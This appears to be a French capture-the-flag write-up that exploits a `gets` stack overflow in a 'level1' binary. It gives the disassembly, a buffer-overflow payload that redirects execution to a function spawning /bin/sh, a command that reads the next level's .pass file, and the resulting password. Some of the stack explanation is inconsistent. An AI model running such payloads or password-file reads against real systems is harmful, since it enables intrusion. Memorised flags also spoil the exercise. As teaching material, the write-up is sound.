Sur ce binaire, on a une fonction `main` toute basique, accompagnée juste au dessus d'une fonction `run` (`objdump -M intel -d level1`):
```
08048444 <run>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
 804844f:	89 c2                	mov    edx,eax
 8048451:	b8 70 85 04 08       	mov    eax,0x8048570
 8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048469:	00 
 804846a:	89 04 24             	mov    DWORD PTR [esp],eax
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    

08048480 <main>:
 8048480:	55                   	push   ebp
 8048481:	89 e5                	mov    ebp,esp
 8048483:	83 e4 f0             	and    esp,0xfffffff0
 8048486:	83 ec 50             	sub    esp,0x50
 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave
 8048496:	c3                   	ret
```

La fonction `main` est donc tout d'abord exécutée, elle laisse `0x50` = `80` caracters de place dans la stack, se déplace à 16 caractères de là, et définie donc cette position pour recevoir une chaine de caractère prise en entrée par la fonction `gets`.

La première chose à laquelle on pense face à ça c'est : On fait quoi ?

Pas de panique, c'est une attaque connue. Lorsque l'on rentre dans un programme / fonction, l'adresse de retour de la fonction (utilisée lorsque la fonction retourne) est utilisée pour continuer les instructions de la fonction précédente.
Par chance, cette adresse est stockée sur la Stack, et en plus, on peut écrire dessus grâce à un overflow de celle-ci.

Comment est-ce possible ?

La stack au démarrage de la fonction `main` contient `argc`, `argc`, `envp` (si utilisés). Elle contient également toutes les ressources nécessaire au bon fonctionnement des fonctions de la callstack.

De ce que l'on peut voir du code, l'état de notre stack est à la positoon `ebp` dans la mémoire. Puis, on va retirer 80 octets sur cette position afin de pouvoir remplir l'espace entre les deux de données.

Par exemple, si on alloue une chaine de 80 caractères, notre stack pourrait ressembler à ça :
______________________
|        stack       |
|____________________|
| position | valeur  |
|__________|_________|
| ebp-4    | old_stack |
| ebp      | ret address |
| ebp+4    | argc    |
| ebp+8    | argv    	|
| ebp+64   | pointeur vers la string de `gets` |
| ebp+80   | fin du pointeur de la stack sur la frame |
|__________|_________|

Fonction `run`:
Elle créée sa stack, elle lui laisse 24B dedans, elle copie dans `edx` un pointeur (`stdout@@GLIBC_2.0`),  puis elle move "Good... Wait what?" dans `eax`.
Elle fou tout dans la stack :
```
______________________
| position | element |
|__________|_________|
| 12       | stdout@ |
| 8        | 19      |
| 4        | 1       |
| 0        | "Good." |
|__________|_________|
```

Ensuite il appel `write`, je rappel dans l'ordre de la stack conventionnellement au `x86` et non `x86_64`, on utilise pas les registres en tant que paramètre mais directement la stack, donc :
`fwrite(stdout("Good..."), 19, 1)` donc, il va écrire dans le `stream` retourné par la fonction `stdout` dans laquelle on aura passé la string `Good ...` pendant `19` membre de taille `1`.

Ensuite, il va move la string contenu dans le pointeur `0x8048584` = `/bin/sh` dans la stack, et va appeler `system`, qui va exécuter `/bin/sh`, une fois fini, on sort de la fonction

Attention au EOF.

Payload:
```sh
python -c '__import__("sys").stdout.write("A"*80+"\x44\x84\x04\x08")' > /tmp/exploit
cat /tmp/exploit - | ./level1
cat /home/user/level2/.pass
```

`53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`